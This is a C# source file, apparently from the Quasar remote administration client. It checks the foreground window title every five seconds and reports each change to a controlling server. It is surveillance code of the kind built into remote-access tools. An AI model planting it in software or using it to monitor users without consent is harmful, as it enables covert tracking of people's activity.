using System;
using System.Text;
using System.Threading;
using Quasar.Client.Networking;
using Quasar.Common.Messages;
using System.Runtime.InteropServices;


namespace Quasar.Client.User
{
    public class ActiveWindowChecker : IDisposable
    {
        /// <summary>
        /// The client to use for communication with the server.
        /// </summary>
        private readonly QuasarClient _client;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        /// <summary>
        /// Initializes a new instance of <see cref="ActiveWindowChecker"/> using the given client.
        /// </summary>
        /// <param name="client">The client to use for communication with the server.</param>
        public ActiveWindowChecker(QuasarClient client)
        {
            _client = client;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        /// <summary>
        /// Starts the active window checking.
        /// </summary>
        public void Start()
        {
            new Thread(CheckActiveWindowThread).Start();
        }

        /// <summary>
        /// Checks for the active window every 5 seconds and sends <see cref="SetUserActiveWindowStatus"/> to the <see cref="_client"/> on change.
        /// </summary>
        private void CheckActiveWindowThread()
        {
            string lastWindowTitle = null;

            while (!_token.IsCancellationRequested)
            {
                try
                {
                    string currentWindowTitle = GetCurrentWindowTitle();
                    if (currentWindowTitle != lastWindowTitle)
                    {
                        lastWindowTitle = currentWindowTitle;
                        _client.Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle });
                    }
                }
                catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                {
                }

                Thread.Sleep(5000); // Check every 5 seconds
            }
        }

        /// <summary>
        /// Gets the title of the current foreground window.
        /// </summary>
        /// <returns>The title of the current foreground window.</returns>
        private string GetCurrentWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this active window checker.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
